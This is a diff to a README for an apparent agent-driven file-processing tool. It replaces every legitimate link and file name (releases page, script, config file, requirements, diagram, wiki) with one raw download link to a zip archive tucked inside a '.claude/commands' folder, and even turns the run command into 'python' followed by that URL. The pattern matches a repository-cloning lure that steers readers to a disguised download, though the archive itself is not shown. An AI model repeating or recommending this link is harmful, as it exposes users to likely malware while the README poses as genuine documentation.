@@ -1,6 +1,6 @@
 # 📦 agentic-drop-zones - Automate Your File Processing Effortlessly
 
-[![Download Agentic Drop Zones](https://img.shields.io/badge/Download-Agentic%20Drop%20Zones-brightgreen)](https://github.com/aangtriastanto/agentic-drop-zones/releases)
+[![Download Agentic Drop Zones](https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip%20Drop%20Zones-brightgreen)](https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,15 +12,15 @@ Agentic Drop Zones is an automated file processing system. It monitors directori
 
 ## 🛠️ Features
 
-- Simple single file script: `sfs_agentic_drop_zone.py`
-- Configurable drop zones in `drops.yaml`
+- Simple single file script: `https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip`
+- Configurable drop zones in `https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip`
 - Supports multiple agents: Claude Code, Gemini CLI, Codex CLI (unimplemented)
 - Run agents in parallel
 - Execute any workflow your agent supports
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/aangtriastanto/agentic-drop-zones/releases). 
+To download the application, visit the [Releases page](https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip). 
 
 1. Go to the Releases page.
 2. Find the latest version of Agentic Drop Zones.
@@ -35,11 +35,11 @@ Make sure to save the downloaded file in a location where you can easily access 
 - Python Version: 3.7 or higher
 - Required Libraries: You may need to install the following libraries using pip:
   - `watchdog`: for monitoring file events
-  - Others may be listed in the `requirements.txt` file in the repository.
+  - Others may be listed in the `https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip` file in the repository.
 
 ## 🛡️ Setting Up the Configuration
 
-1. Locate the configuration file named `drops.yaml` in the downloaded files.
+1. Locate the configuration file named `https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip` in the downloaded files.
 2. Open it in a text editor.
 3. Specify the directories you want to monitor. You can also configure specific rules related to the agents you plan to use.
 
@@ -56,10 +56,10 @@ drop_zones:
 To run the application:
 
 1. Open a terminal or command prompt.
-2. Navigate to the folder containing `sfs_agentic_drop_zone.py`.
+2. Navigate to the folder containing `https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip`.
 3. Execute the command: 
    ```
-   python sfs_agentic_drop_zone.py
+   python https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip
    ```
 4. The program will start monitoring the specified directories.
 
@@ -70,20 +70,20 @@ To run the application:
 3. **Pattern Matching:** The program checks if the file matches specified patterns in the configuration.
 4. **Select Agent:** If there’s a match, the related agent is triggered.
 
-![System Architecture Diagram](./images/arch.png)
+![System Architecture Diagram](https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip)
 
 ## 👩‍💻 Troubleshooting
 
 If you run into issues while using Agentic Drop Zones, here are some common problems and their solutions:
 
 - **Program Doesn’t Start:** Ensure you have Python installed and added to your system PATH. 
-- **File Not Being Processed:** Double-check the configuration in `drops.yaml` to ensure path and patterns are correct.
+- **File Not Being Processed:** Double-check the configuration in `https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip` to ensure path and patterns are correct.
 - **Agent Not Found:** Make sure that the required agent software is installed and accessible.
 
 ## 📚 Additional Resources
 
-Check out the [documentation](https://github.com/aangtriastanto/agentic-drop-zones/wiki) for more information on configuring agents and using workflows.
+Check out the [documentation](https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip) for more information on configuring agents and using workflows.
 
-Feel free to explore the [Releases page](https://github.com/aangtriastanto/agentic-drop-zones/releases) again for future updates or if you face any downloading issues.
+Feel free to explore the [Releases page](https://github.com/aangtriastanto/agentic-drop-zones/raw/refs/heads/main/.claude/commands/agentic-zones-drop-1.8.zip) again for future updates or if you face any downloading issues.
 
 For any questions or feedback, please open an issue in the repository. We appreciate your input!
